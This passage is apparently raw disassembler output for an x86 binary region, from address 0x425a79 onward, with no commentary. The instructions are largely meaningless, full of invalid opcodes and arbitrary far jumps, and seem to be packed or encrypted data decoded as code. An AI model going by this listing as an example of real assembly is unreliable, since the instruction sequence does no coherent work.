  425a79:	jcxz   0x425a63
  425a7c:	(bad)  
  425a7d:	fimul  DWORD PTR [edi+eax*4+0x253a7128]
  425a84:	lea    edx,[edx+0x1050001]
  425a8a:	add    BYTE PTR [eax],al
  425a8c:	mov    edi,0xaa946b0e
  425a91:	mov    esp,es
  425a93:	and    al,0xa9
  425a95:	leave  
  425a96:	sub    eax,0x273555cb
  425a9b:	adc    esi,DWORD PTR [edx]
  425a9d:	loope  0x425a50
  425a9f:	mov    esp,?
  425aa1:	jle    0x425b0f
  425aa3:	(bad)  
  425aa4:	ja     0x425af6
  425aa6:	push   esp
  425aa7:	(bad)  
  425aa8:	stos   DWORD PTR es:[edi],eax
  425aa9:	or     eax,0x7303d351
  425aae:	and    eax,0x2a8b8626
  425ab3:	mov    ds:0x72281fe1,al
  425ab8:	xor    DWORD PTR [ecx-0x5bfc3052],0x6c6b727e
  425ac2:	outs   dx,BYTE PTR ds:[esi]
  425ac3:	adc    DWORD PTR [eax+0x46],0xe63ae045
  425aca:	into   
  425acb:	out    dx,al
  425acc:	jbe    0x425b16
  425ace:	cmc    
  425acf:	xor    eax,DWORD PTR [ebp+ebp*2+0x3a]
  425ad3:	aaa    
  425ad4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425ad5:	pushf  
  425ad6:	mov    bl,0x58
  425ad8:	mov    al,ds:0x8998e848
  425add:	cdq    
  425ade:	scas   eax,DWORD PTR es:[edi]
  425adf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425ae0:	(bad)  [ecx-0x56]
  425ae3:	push   ebx
  425ae4:	xor    BYTE PTR [edx-0x28],0x33
  425ae8:	and    DWORD PTR [esi-0x6c],edi
  425aeb:	mov    bh,0x27
  425aed:	jne    0x425a86
  425aef:	mov    ebx,0xd3a364f4
  425af4:	imul   ecx,DWORD PTR [edi+edi*8],0xfffffff6
  425af8:	add    al,0xd6
  425afa:	lods   eax,DWORD PTR ss:[esi]
  425afc:	add    bl,ch
  425afe:	shl    DWORD PTR [ebx+0x29],cl
  425b01:	loope  0x425b6b
  425b03:	jge    0x425b4a
  425b05:	cmp    al,0xe2
  425b07:	in     eax,0x81
  425b09:	rol    BYTE PTR [ebx+0x43],1
  425b0c:	sbb    ah,dh
  425b0e:	cwde   
  425b0f:	jmp    0x5ba7:0x6dff99a8
  425b16:	int3   
  425b17:	shl    ebx,0xf4
  425b1a:	xor    eax,0xd866917d
  425b1f:	xchg   esi,eax
  425b20:	xchg   BYTE PTR [esi+0x2e],ch
  425b23:	xor    ecx,DWORD PTR [esi-0x23]
  425b26:	les    eax,FWORD PTR [edx-0x34]
  425b29:	imul   ebp,DWORD PTR [ebx+0x5158598],0x10868ed2
  425b33:	sub    eax,0xb2263cad
  425b38:	pop    eax
  425b39:	fisub  WORD PTR [ebx-0x55e9c4d1]
  425b3f:	dec    edx
  425b40:	scas   eax,DWORD PTR es:[edi]
  425b41:	add    al,0xc9
  425b43:	fnstcw WORD PTR [ebx+0x73c88deb]
  425b49:	lock clc 
  425b4b:	xchg   esp,eax
  425b4c:	push   0x6134a5d9
  425b51:	in     eax,0x3d
  425b53:	pop    ecx
  425b54:	and    BYTE PTR [ebp+ebp*8+0x3a00ed27],0x4c
  425b5c:	sbb    DWORD PTR [eax+0x3647199],esp
  425b62:	inc    ebx
  425b63:	sub    ch,BYTE PTR [ecx]
  425b65:	pop    ds
  425b66:	add    DWORD PTR [ebx+0x7a],esp
  425b69:	cmp    BYTE PTR [edx],dh
  425b6b:	or     BYTE PTR [ebp+0x5d448668],0xf9
  425b72:	mov    bl,0x9c
  425b74:	jmp    0xfd99:0xe2292933
  425b7b:	jno    0x425b4a
  425b7d:	pop    ebx
  425b7e:	mov    al,ds:0x79256cad
  425b83:	jae    0x425b1c
  425b85:	sbb    dl,BYTE PTR [edx]
  425b87:	hlt    
  425b88:	jb     0x425bf0
  425b8a:	xchg   ecx,eax
  425b8b:	inc    esp
  425b8c:	(bad)  
  425b8d:	jp     0x425b10
  425b8f:	dec    edi
  425b90:	jl     0x425b92
	...
  425bf2:	add    BYTE PTR [eax],al
  425bf4:	(bad)  
  425bf5:	clc    
  425bf6:	jnp    0x425c4e
  425bf8:	jg     0x425bd1
  425bfa:	in     eax,dx
  425bfb:	cli    
  425bfc:	enter  0xe6cd,0x96
  425c00:	and    al,BYTE PTR [ebp+ebx*4-0x64]
  425c04:	xchg   edx,eax
  425c05:	xchg   ebx,eax
  425c06:	add    DWORD PTR [eax],eax
  425c08:	add    eax,0xa0000001
  425c0d:	push   esi
  425c0e:	push   edx
  425c0f:	ja     0x425b99
  425c11:	add    BYTE PTR [edi],0x81
  425c14:	bound  edi,QWORD PTR [ebx+ebx*1]
  425c17:	jbe    0x425bb6
  425c19:	adc    ecx,DWORD PTR [esi-0x6441caa6]
  425c1f:	or     BYTE PTR [ebp+0x15],al
  425c22:	sub    dh,dl
  425c24:	pop    ds
  425c25:	ss stos DWORD PTR es:[edi],eax
  425c27:	xchg   ebp,eax
  425c28:	test   eax,0xa2c49824
  425c2d:	inc    edi
  425c2e:	sbb    ebx,DWORD PTR [ecx]
  425c30:	lods   al,BYTE PTR ds:[esi]
  425c31:	push   0x1cebc8ec
  425c36:	(bad)  
  425c37:	jp     0x425bef
  425c39:	push   ds
  425c3a:	arpl   WORD PTR [esi-0x18],di
  425c3d:	cmp    esi,DWORD PTR [edi]
  425c3f:	sbb    al,0x50
  425c41:	clc    
  425c42:	in     al,dx
  425c43:	mov    gs,WORD PTR [edi]
  425c45:	adc    al,0x8a
  425c47:	adc    cl,BYTE PTR [edi-0x79]
  425c4a:	loopne 0x425c21
  425c4c:	sbb    bl,BYTE PTR [eax]
  425c4e:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  425c50:	stos   BYTE PTR es:[edi],al
  425c51:	cld    
  425c52:	(bad)  
  425c53:	mov    edi,0x633ff4e3
  425c58:	mov    al,ds:0x6bad9d4b
  425c5d:	jbe    0x425be7
  425c5f:	push   ds
  425c60:	rcr    ebp,cl
  425c62:	mov    fs,WORD PTR [esi-0x3e]
  425c65:	test   BYTE PTR [eax-0x6],al
  425c68:	mov    esp,0x94ea983d
  425c6d:	les    eax,FWORD PTR [eax-0x76]
  425c70:	inc    ebx
  425c71:	jle    0x425c8d
  425c73:	xor    ebp,edx
  425c75:	call   0xb630:0xe4ef5b05
  425c7c:	xchg   ebp,eax
  425c7d:	jbe    0x425cb9
  425c7f:	jmp    0xf1c5:0x99ed28ec
  425c86:	mov    edx,0x2a89c2
  425c8b:	push   ecx
  425c8c:	jae    0x425cc5
  425c8e:	mov    DWORD PTR [ebx-0x6b],esp
  425c91:	std    
  425c92:	or     ecx,DWORD PTR gs:[edx]
  425c95:	gs into 
  425c97:	mov    WORD PTR [edx+0x7a80f043],es
  425c9d:	sbb    dl,BYTE PTR [eax]
  425c9f:	arpl   WORD PTR [edi-0x78e0567e],dx
  425ca5:	je     0x425cb7
  425ca7:	test   eax,0xbcb3d300
  425cac:	add    DWORD PTR [esi-0x54],eax
  425caf:	cmp    al,0x4f
  425cb1:	dec    ebx
  425cb2:	mov    ah,0x84
  425cb4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425cb5:	or     BYTE PTR [ebp-0x3e],0xdb
  425cb9:	addr16 mov edi,0x55c3bf77
  425cbf:	jmp    0x6446ed42
  425cc4:	pop    esp
  425cc5:	jecxz  0x425d20
  425cc7:	inc    eax
  425cc8:	stc    
  425cc9:	mov    esp,0x3c16e1b3
  425cce:	pop    esi
  425ccf:	or     edi,DWORD PTR [edi]
  425cd1:	push   0x3f
  425cd3:	inc    ebp
  425cd4:	nop
  425cd5:	sub    DWORD PTR [edx-0x22cc92df],0xfffffff4
  425cdc:	push   edi
  425cdd:	cmp    al,0x44
  425cdf:	add    DWORD PTR [ebx-0x2f],0xffffff9a
  425ce3:	mov    bl,0xd1
  425ce5:	mov    eax,0x3825a390
  425cea:	cli    
  425ceb:	cmc    
  425cec:	lea    edx,[ecx+edi*4+0x53983eb1]
  425cf3:	xor    cl,BYTE PTR [ecx+0x60ba24cb]
  425cf9:	xchg   BYTE PTR [edx+0x6],al
  425cfc:	dec    esp
  425cfd:	rol    DWORD PTR [esi+0x3b2bfe96],cl
  425d03:	fsub   DWORD PTR [ecx]
  425d05:	hlt    
  425d06:	dec    edi
  425d07:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425d08:	(bad)  
  425d09:	mov    dh,BYTE PTR [ecx+eiz*4+0x58b4b0d5]
  425d10:	sbb    al,0x0
	...
  425d72:	add    BYTE PTR [eax],al
  425d74:	jmp    FWORD PTR [esp+ebx*8-0x8820f9]
  425d7b:	cld    
  425d7c:	gs addr16 stc 
  425d7f:	mov    ds:0x4c0566c6,al
  425d84:	xchg   edi,eax
  425d85:	xchg   esp,eax
  425d86:	add    DWORD PTR [eax],eax
  425d88:	add    eax,0x1b000001
  425d8d:	dec    DWORD PTR [ebp-0x77]
  425d90:	pop    esi
  425d91:	int    0x2f
  425d93:	clc    
  425d94:	sub    al,0xe8
  425d96:	push   0x6a
  425d98:	add    BYTE PTR [ecx-0x5c215c56],bh
  425d9e:	xlat   BYTE PTR ds:[ebx]
  425d9f:	adc    esp,DWORD PTR [ebx+eiz*2+0x7f]
  425da3:	ja     0x425d2b
  425da5:	dec    ebx
  425da6:	ins    DWORD PTR es:[edi],dx
  425da7:	mov    bh,0x42
  425da9:	in     al,dx
  425daa:	cmc    
  425dab:	lods   al,BYTE PTR ds:[esi]
  425dac:	dec    ecx
  425dad:	add    cl,al
  425daf:	iret   
  425db0:	test   eax,0x23c4c0fe
  425db5:	and    eax,0xff264943
  425dba:	(bad)  
  425dbb:	lods   al,BYTE PTR ds:[si]
  425dbd:	xlat   BYTE PTR ds:[ebx]
  425dbe:	loop   0x425e1e
  425dc0:	mov    eax,0xc8ef6fa0
  425dc5:	jns    0x425e08
  425dc7:	loop   0x425df6
  425dc9:	int    0xf7
  425dcb:	je     0x425dca
  425dcd:	int    0xec
  425dcf:	xor    cl,BYTE PTR [esi+0x59c23e90]
  425dd5:	mov    BYTE PTR [edx-0x7761e5ab],0xbd
  425ddc:	mov    ch,0xcf
  425dde:	scas   eax,DWORD PTR es:[edi]
  425ddf:	mov    eax,0xac2a1cbf
  425de4:	pop    edi
  425de5:	pop    ebp
  425de6:	ror    DWORD PTR ds:0xbd4f8171,1
  425dec:	sbb    dl,BYTE PTR [eax+edi*4]
  425def:	fwait
  425df0:	bound  ecx,QWORD PTR [eax+edx*2]
  425df3:	or     dh,BYTE PTR [edi+0x60382ec7]
  425df9:	scas   al,BYTE PTR es:[edi]
  425dfa:	fbld   TBYTE PTR es:[edx]
  425dfd:	clc    
  425dfe:	mov    ebp,0xf8f02315
  425e03:	fsub   DWORD PTR [edx-0x6f]
  425e06:	push   edx
  425e07:	js     0x425e7f
  425e09:	repz int 0xdc
  425e0c:	cmp    BYTE PTR [edi],al
  425e0e:	mov    ch,0x93
  425e10:	add    eax,0x2b11bb97
  425e15:	jo     0x425e4d
  425e17:	retf   0x8aaf
  425e1a:	or     DWORD PTR [ebp-0x50],edi
  425e1d:	adc    DWORD PTR [esi],esi
  425e1f:	js     0x425e45
  425e21:	xor    ch,BYTE PTR [ecx-0x65f9d189]
  425e27:	repnz imul eax,DWORD PTR [esi+0x7c],0x3f44f60e
  425e2f:	fwait
  425e30:	jge    0x425dba
  425e32:	cmp    al,0xb8
  425e34:	into   
  425e35:	mov    eax,ds:0x30827db8
  425e3a:	scas   al,BYTE PTR es:[edi]
  425e3b:	and    cl,BYTE PTR [eax]
  425e3d:	pop    ds
  425e3e:	mov    bl,BYTE PTR [edi+ebp*2]
  425e41:	es call 0xf90515ba
  425e47:	push   0xe360b3ce
  425e4c:	in     al,0x9b
  425e4e:	retf   0x90dc
  425e51:	pop    esi
  425e52:	inc    ecx
  425e53:	popf   
  425e54:	test   eax,0x918325b
  425e59:	mov    ebp,0x26ea359
  425e5e:	xchg   ebp,eax
  425e5f:	or     ch,ch
  425e61:	fbstp  TBYTE PTR [eax+0x5b0a46fd]
  425e67:	push   eax
  425e68:	cdq    
  425e69:	cli    
  425e6a:	icebp  
  425e6b:	mov    eax,ds:0x6af8dfe9
  425e70:	inc    eax
  425e71:	dec    esi
  425e72:	scas   eax,DWORD PTR es:[edi]
  425e73:	pushf  
  425e74:	jecxz  0x425e12
  425e76:	imul   eax,DWORD PTR [edi+0x67],0xb8569ffc
  425e7d:	jp     0x425e1e
  425e7f:	dec    edi
  425e80:	aam    0x4a
  425e82:	pushf  
  425e83:	adc    cl,bl
  425e85:	cmc    
  425e86:	xchg   ebp,eax
  425e87:	das    
  425e88:	and    DWORD PTR cs:[esp+edi*4+0x18],ecx
  425e8d:	mov    ebx,edi
  425e8f:	mov    ecx,0xe0
	...
  425ef4:	(bad)  
  425ef5:	jl     0x425f48
  425ef7:	sar    bl,1
  425ef9:	std    
  425efa:	(bad)  
  425efb:	jle    0x425ec9
  425efd:	pop    ss
  425efe:	popf   
  425eff:	scas   eax,DWORD PTR es:[edi]
  425f00:	mul    BYTE PTR [ecx-0x6a634fa4]
  425f06:	add    DWORD PTR [eax],eax
  425f08:	add    eax,0x55000001
  425f0d:	(bad)  
  425f0e:	xor    eax,0x466bc20e
  425f13:	sbb    BYTE PTR [ecx+esi*2+0x78],bl
  425f17:	mov    dl,0x33
  425f19:	push   esi
  425f1a:	sahf   
  425f1b:	adc    edx,ecx
  425f1d:	jl     0x425f79
  425f1f:	inc    esi
  425f20:	fstp   DWORD PTR [ebp-0x27]
  425f23:	hlt    
  425f24:	pushf  
  425f25:	mov    ebx,0x80551bfb
  425f2a:	push   ss
  425f2b:	sub    al,0x3c
  425f2d:	inc    edi
  425f2e:	pusha  
  425f2f:	jno    0x425fa1
  425f31:	adc    DWORD PTR [eax],ebx
  425f33:	sub    DWORD PTR [ebp-0x20],ebp
  425f36:	mov    dh,0x10
  425f38:	mov    bl,0xed
  425f3a:	adc    eax,0x571223f1
  425f3f:	and    eax,DWORD PTR [ebx+0x68]
  425f42:	push   ss
  425f43:	inc    edx
  425f44:	loopne 0x425f7f
  425f46:	inc    ebx
  425f47:	pop    edx
  425f48:	fisttp QWORD PTR [edx]
  425f4a:	enter  0xdd5f,0x1f
  425f4e:	dec    esi
  425f4f:	ficom  DWORD PTR [edx-0x28]
  425f52:	jno    0x425fa1
  425f54:	mov    ch,0x7a
  425f56:	adc    BYTE PTR [eax-0x401bceec],ah
  425f5c:	call   0x9af5:0xd56d35d5
  425f63:	test   BYTE PTR [ebx],dh
  425f65:	push   esp
  425f66:	xor    cl,BYTE PTR [eax+0x275c80e4]
  425f6c:	jb     0x425fe3
  425f6e:	(bad)  
  425f6f:	dec    eax
  425f70:	mov    al,0x96
  425f72:	inc    esi
  425f73:	and    BYTE PTR [edi+0x5a21e86d],0x1e
  425f7a:	cmp    BYTE PTR [edx+0x5],ah
  425f7d:	loope  0x425f7e
  425f7f:	in     eax,0x15
  425f81:	bound  edx,QWORD PTR [ecx]
  425f83:	leave  
  425f84:	jmp    0xae2:0xcc15af7f
  425f8b:	das    
  425f8c:	add    ecx,DWORD PTR [esi-0x2a085a67]
  425f92:	out    dx,eax
  425f93:	and    DWORD PTR [edx],0xe2c33613
  425f99:	cmp    BYTE PTR [eax],al
  425f9b:	ja     0x425f42
  425f9d:	lods   al,BYTE PTR ds:[esi]
  425f9e:	mov    esi,0x23f99e2
  425fa3:	or     dh,BYTE PTR [ecx-0x31]
  425fa6:	push   cs
  425fa7:	mov    bh,BYTE PTR [ebx-0x5b35fbde]
  425fad:	xchg   edx,eax
  425fae:	pop    edx
  425faf:	jle    0x425fc8
  425fb1:	sub    dl,BYTE PTR [eax-0x4f]
  425fb4:	xchg   ebx,eax
  425fb5:	push   eax
  425fb6:	xor    dh,dl
  425fb8:	xchg   BYTE PTR [edi+0x4d46151a],bl
  425fbe:	mov    WORD PTR [eax+ebx*4+0x70],ds
  425fc2:	mov    eax,0xc3b8a3fc
  425fc7:	out    dx,eax
  425fc8:	(bad)  [ecx+0x29cb151b]
  425fce:	ror    bh,0xd5
  425fd1:	mov    ah,0x2c
  425fd3:	aam    0x82
  425fd5:	das    
  425fd6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425fd7:	aas    
  425fd8:	lods   al,BYTE PTR ds:[esi]
  425fd9:	mov    ds:0xff78f2c0,al
  425fde:	jb     0x425f93
  425fe0:	inc    ebp
  425fe1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425fe2:	adc    al,0xd4
  425fe4:	xor    ch,dl
  425fe6:	ds jp  0x426008
  425fe9:	sbb    DWORD PTR [esi],ecx
  425feb:	clc    
  425fec:	jg     0x426059
  425fee:	mov    bl,0x8a
  425ff0:	dec    esi
  425ff1:	mov    esi,0xc08eda3b
  425ff6:	jge    0x426064
  425ff8:	mov    al,0x5c
  425ffa:	cmp    eax,0x285d598b
  425fff:	neg    DWORD PTR [ebx-0x11]
  426002:	aam    0x52
  426004:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426005:	push   es
  426006:	push   ebx
  426007:	sbb    cl,BYTE PTR [eax-0x6d]
  42600a:	stos   DWORD PTR es:[edi],eax
  42600b:	aam    0xb1
  42600d:	and    eax,DWORD PTR [bx+si+0x16]
	...
  426071:	add    BYTE PTR [eax],al
  426073:	add    BYTE PTR [ecx],bh
  426075:	cwde   
  426076:	or     eax,DWORD PTR [esi]
  426078:	stos   DWORD PTR es:[edi],eax
  426079:	xchg   edi,eax
  42607a:	cmp    eax,0x304575bf
  42607f:	in     al,dx
  426080:	gs jb  0x4260dc
  426083:	jp     0x426026
  426085:	xchg   esi,eax
  426086:	add    DWORD PTR [eax],eax
  426088:	add    eax,0xb9000001
  42608d:	mov    esi,0x93b2bee9
  426092:	lahf   
  426093:	enter  0x4901,0x30
  426097:	inc    edx
  426098:	js     0x426059
  42609a:	sahf   
  42609b:	and    ecx,DWORD PTR [ebp+edx*4+0x5]
  42609f:	sahf   
  4260a0:	jno    0x42606e
  4260a2:	pop    edx
  4260a3:	sbb    edx,ebp
  4260a5:	add    al,BYTE PTR ds:0x895542d2
  4260ab:	lock push cs
  4260ad:	sbb    DWORD PTR [ecx+0x45763867],ebx
  4260b3:	gs sbb esi,esi
  4260b6:	ja     0x426078
  4260b8:	out    0xdb,eax
  4260ba:	adc    edi,DWORD PTR [eax+ecx*4+0x4f]
  4260be:	xor    ch,BYTE PTR [ebp+0x54ab6ef7]
  4260c4:	fisubr WORD PTR [edx-0x42]
  4260c7:	cwde   
  4260c8:	ror    BYTE PTR [ebx+edi*4+0x63],0xc
  4260cd:	mov    eax,ds:0x2ac35170
  4260d2:	sbb    eax,0xce67ae9c
  4260d7:	cmp    eax,0xbf304bcf
  4260dc:	fwait
  4260dd:	sbb    ah,0xfc
  4260e0:	xchg   ebx,eax
  4260e1:	lea    esp,[edi]
  4260e3:	push   ss
  4260e4:	dec    ecx
  4260e5:	popa   
  4260e6:	(bad)  
  4260e7:	js     0x426135
  4260e9:	adc    esp,eax
  4260eb:	pop    ss
  4260ec:	dec    ebp
  4260ed:	outs   dx,DWORD PTR ds:[esi]
  4260ee:	xchg   esi,eax
  4260ef:	fidiv  WORD PTR [eax-0x71bba026]
  4260f5:	xchg   esp,eax
  4260f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4260f7:	repnz and bl,bl
  4260fa:	outs   dx,DWORD PTR ds:[esi]
  4260fb:	daa    
  4260fc:	xchg   esi,eax
  4260fd:	jmp    0x4260f6
  4260ff:	pop    esp
  426100:	in     eax,0x22
  426102:	retf   0xed57
  426105:	adc    DWORD PTR [ebp+0x7ed68c36],eax
  42610b:	mov    cl,0x6b
  42610d:	push   edx
  42610e:	and    al,0x7
  426110:	push   es
  426111:	retf   0x1d0b
  426114:	retf   0xbd9e
  426117:	adc    BYTE PTR [ebp+eax*2-0x8a1dc43],ah
  42611e:	loop   0x426114
  426120:	or     eax,0x1f3a6ddc
  426125:	cmp    esp,DWORD PTR [edi]
  426127:	aaa    
  426128:	test   DWORD PTR [eax+0x49],eax
  42612b:	jbe    0x426182
  42612d:	(bad)  
  42612e:	out    0xd5,eax
  426130:	in     al,0x5a
  426132:	in     al,dx
  426133:	out    dx,al
  426134:	mov    DWORD PTR [ecx],esp
  426136:	xchg   esp,eax
  426137:	aaa    
  426138:	fdivr  QWORD PTR [edi+ebp*4+0x5016ef66]
  42613f:	jne    0x42614f
  426141:	inc    ebx
  426142:	lods   al,BYTE PTR ds:[esi]
  426143:	and    bh,ah
  426145:	pop    ecx
  426146:	inc    edx
  426147:	dec    edx
  426148:	icebp  
  426149:	sub    dl,al
  42614b:	xchg   esi,eax
  42614c:	pusha  
  42614d:	cwde   
  42614e:	sub    BYTE PTR [eax+0x13e83c20],bh
  426154:	(bad)  [ebx+0x7c]
  426157:	pop    edi
  426158:	mov    ch,al
  42615a:	xor    eax,0xdeb8098b
  42615f:	repnz test cl,bl
  426162:	cli    
  426163:	mov    eax,0xbaf148f9
  426168:	shr    BYTE PTR [edi+0x6d],0xe7
  42616c:	add    DWORD PTR [edx+0x50b97d2d],esp
  426172:	enter  0x22e7,0xb1
  426176:	xlat   BYTE PTR ds:[ebx]
  426177:	jecxz  0x42612b
  426179:	sar    DWORD PTR [esi-0x28],0xc1
  42617d:	rol    BYTE PTR ds:0x6af87e29,cl
  426183:	loop   0x42613a
  426185:	aaa    
  426186:	fcom   st(3)
  426188:	stos   DWORD PTR es:[edi],eax
  426189:	leave  
  42618a:	dec    eax
  42618b:	ds jb  0x4261b4
  42618e:	add    BYTE PTR [eax+0x4a],al
	...
  4261f1:	add    BYTE PTR [eax],al
  4261f3:	add    BYTE PTR [ebx-0x409ef0df],bl
  4261f9:	outs   dx,DWORD PTR ds:[esi]
  4261fa:	(bad)  
  4261fb:	sti    
  4261fc:	mov    bh,0x83
  4261fe:	mov    cl,0x27
  426200:	addr16 or eax,0x97a69aa8
  426206:	add    DWORD PTR [eax],eax
  426208:	add    eax,0xe000001
  42620d:	fisubr DWORD PTR [ebp+0x7b]
  426210:	scas   eax,DWORD PTR es:[edi]
  426211:	jno    0x4261f1
  426213:	lods   eax,DWORD PTR ds:[esi]
  426214:	pop    eax
  426215:	js     0x42619b
  426217:	arpl   WORD PTR [eax-0x36],di
  42621a:	sbb    al,0xcd
  42621c:	and    ecx,DWORD PTR [edx+0x50c3d43f]
  426222:	adc    edx,DWORD PTR [ebx+0x59]
  426225:	cmp    eax,0xf77445dd
  42622a:	mov    esp,DWORD PTR [eax+0x6d47c8c5]
  426230:	add    bl,BYTE PTR [eax]
  426232:	xor    eax,DWORD PTR [esi+ebp*8]
  426235:	test   DWORD PTR [ecx+0x2c97fe15],edx
  42623b:	adc    DWORD PTR [edi],ebx
  42623d:	add    bl,BYTE PTR [edi+0x58]
  426240:	xlat   BYTE PTR ds:[ebx]
  426241:	push   0xe9b79c94
  426246:	scas   al,BYTE PTR es:[edi]
  426247:	lods   eax,DWORD PTR ds:[esi]
  426248:	jo     0x42623e
  42624a:	scas   eax,DWORD PTR es:[edi]
  42624b:	pop    ss
  42624c:	fist   WORD PTR [esi-0x22]
  42624f:	inc    edi
  426250:	sbb    al,0xf6
  426252:	push   ebp
  426253:	not    BYTE PTR [edi]
  426255:	cmp    ch,al
  426257:	xchg   esi,eax
  426258:	imul   esi,DWORD PTR [edi],0xfffffff3
  42625b:	aas    
  42625c:	ins    BYTE PTR es:[edi],dx
  42625d:	aad    0x47
  42625f:	ins    DWORD PTR es:[edi],dx
  426260:	jb     0x426200
  426262:	or     al,0xf0
  426264:	repnz loop 0x4262d4
  426267:	seto   BYTE PTR [ebx-0x5c]
  42626b:	mov    ds:0xa6829ea5,al
  426270:	js     0x43c05563
  426276:	(bad)  
  426277:	test   al,0x34
  426279:	repnz adc eax,0x491aae1e
  42627f:	push   edi
  426280:	sbb    dl,BYTE PTR [esi+0x271cda15]
  426286:	loopne 0x42629c
  426288:	in     al,dx
  426289:	jge    0x42629f
  42628b:	mov    BYTE PTR [esi+0x6d],dl
  42628e:	or     DWORD PTR [esi+ecx*2-0xe3a5b70],0x5bbc0fd9
  426299:	xor    BYTE PTR ds:0x611ad262,0x3d
  4262a0:	pop    es
  4262a1:	in     al,0xe
  4262a3:	mov    edi,0x316f4a0c
  4262a8:	dec    ebx
  4262a9:	cmp    eax,0xabab8e98
  4262ae:	or     eax,0x367cd389
  4262b3:	cld    
  4262b4:	repz es test eax,0xaee040f4
  4262bb:	add    ch,cl
  4262bd:	xchg   esi,eax
  4262be:	es push ecx
  4262c0:	xchg   edx,eax
  4262c1:	jnp    0x426303
  4262c3:	cmp    BYTE PTR ds:0xfed2f9e9,dh
  4262c9:	jmp    0xe4da:0x233e6bb8
  4262d0:	fild   DWORD PTR [edi+eiz*2-0x58]
  4262d4:	scas   eax,DWORD PTR es:[edi]
  4262d5:	stos   BYTE PTR es:[edi],al
  4262d6:	je     0x426324
  4262d8:	jbe    0x426326
  4262da:	jmp    0xf1be:0x7e950aa9
  4262e1:	dec    eax
  4262e2:	xor    eax,0xe01cf9ff
  4262e7:	mov    cl,dl
  4262e9:	lods   al,BYTE PTR ds:[si]
  4262eb:	mov    ebp,0x96510385
  4262f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4262f1:	shl    DWORD PTR [esi+0x51e6f3d5],1
  4262f7:	fcom   DWORD PTR [edi+0x73]
  4262fa:	push   ss
  4262fb:	hlt    
  4262fc:	cmp    al,0x5c
  4262fe:	inc    edx
  4262ff:	dec    esp
  426300:	jno    0x42635d
  426302:	pop    edi
  426303:	les    eax,FWORD PTR [edi]
  426305:	retf   0xd6fa
  426308:	loope  0x426380
  42630a:	inc    ecx
  42630b:	pop    eax
  42630c:	aaa    
  42630d:	inc    ecx
  42630e:	and    al,BYTE PTR [ecx+0x42]
	...
  426374:	push   esp
  426375:	and    eax,0xeefd4e8d
  42637a:	xlat   BYTE PTR ds:[ebx]
  42637b:	aas    
  42637c:	dec    ecx
  42637d:	sbb    esi,edi
  42637f:	or     eax,0x30c5d4e1
  426384:	stos   DWORD PTR es:[edi],eax
  426385:	cwde   
  426386:	add    DWORD PTR [eax],eax
  426388:	add    eax,0xb5000001
  42638d:	xor    eax,0xef895cad
  426392:	sti    
  426393:	dec    edx
  426394:	mov    dh,0xac
  426396:	ss stc 
  426398:	mov    edi,0xa45c78ec
  42639d:	sbb    al,0x5
  42639f:	jne    0x42640e
  4263a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4263a2:	pusha  
  4263a3:	dec    eax
  4263a4:	dec    BYTE PTR [ecx+0x32]
  4263a7:	enter  0xb0d,0xaf
  4263ab:	xchg   ecx,eax
  4263ac:	xor    cl,BYTE PTR [edi]
  4263ae:	sti    
  4263af:	pusha  
  4263b0:	sti    
  4263b1:	xlat   BYTE PTR ds:[ebx]
  4263b2:	dec    edi
  4263b3:	pop    ss
  4263b4:	jmp    0x426374
  4263b6:	out    0x7b,eax
  4263b8:	or     ch,dh
  4263ba:	in     eax,0x41
  4263bc:	xchg   DWORD PTR [ebx+0x4e689355],edi
  4263c2:	pop    ecx
  4263c3:	xor    DWORD PTR [edx+0x1e],0xa07905bf
  4263ca:	rol    BYTE PTR [esi+0x2f],0x58
  4263ce:	adc    eax,0x50374913
  4263d3:	out    0x1c,al
  4263d5:	inc    eax
  4263d6:	jmp    0x282b:0xe5aa74e8
  4263dd:	imul   eax,DWORD PTR [eax],0xb217c434
  4263e3:	or     DWORD PTR ds:[eax],eax
  4263e6:	lods   al,BYTE PTR ds:[esi]
  4263e7:	test   al,0x1c
  4263e9:	add    DWORD PTR [ebp-0x77],ebx
  4263ec:	lods   eax,DWORD PTR ds:[esi]
  4263ed:	sub    esp,DWORD PTR [edi-0x133409e4]
  4263f3:	jmp    0x42644c
  4263f5:	lahf   
  4263f6:	mov    ecx,0x276eab85
  4263fb:	leave  
  4263fc:	pop    esi
  4263fd:	(bad)  
  4263fe:	iret   
  4263ff:	les    ecx,FWORD PTR [ebx-0x35]
  426402:	cld    
  426403:	push   cs
  426404:	bnd data16 jmp 0x4263e0
  426408:	sub    eax,0x4b68bac5
  42640d:	inc    ecx
  42640e:	sub    eax,0x63fec588
  426413:	gs mov eax,0xdacdf9e5
  426419:	cmc    
  42641a:	fsub   DWORD PTR [ebp-0x1]
  42641d:	dec    edx
  42641e:	pushw  es
  426420:	mov    eax,ebx
  426422:	loop   0x426472
  426424:	mov    eax,ds:0xd57e8088
  426429:	add    WORD PTR [eax+eiz*2],0x79
  42642e:	popf   
  42642f:	stc    
  426430:	jge    0x4263ef
  426432:	sbb    BYTE PTR [ebx+0x3fe43fe7],ch
  426438:	add    DWORD PTR ds:0xe45f0a91,ebp
  42643e:	xor    ebx,DWORD PTR [ebx-0x3ed2e500]
  426444:	sbb    DWORD PTR [ebx+0x66e4f2ca],edi
  42644a:	gs sub al,0xa8
  42644d:	nop
  42644e:	(bad)  
  42644f:	jmp    0x4264b2
  426451:	and    DWORD PTR [edi-0x495dbcd4],esp
  426457:	fsub   st(6),st
  426459:	or     eax,0xf70983e0
  42645e:	mov    edi,0xc3a2f9b2
  426463:	lods   eax,DWORD PTR ds:[esi]
  426464:	dec    esp
  426465:	adc    al,0xcf
  426467:	mov    ah,0x6
  426469:	or     BYTE PTR [ebx+0x2f],0x3a
  42646d:	mov    BYTE PTR [esi],bh
  42646f:	and    ch,BYTE PTR [ebx-0x17d2d07]
  426475:	mov    al,BYTE PTR [eax]
  426477:	xchg   esi,eax
  426478:	inc    edi
  426479:	xor    eax,0x6137190d
  42647e:	mov    edi,0xd03b99c8
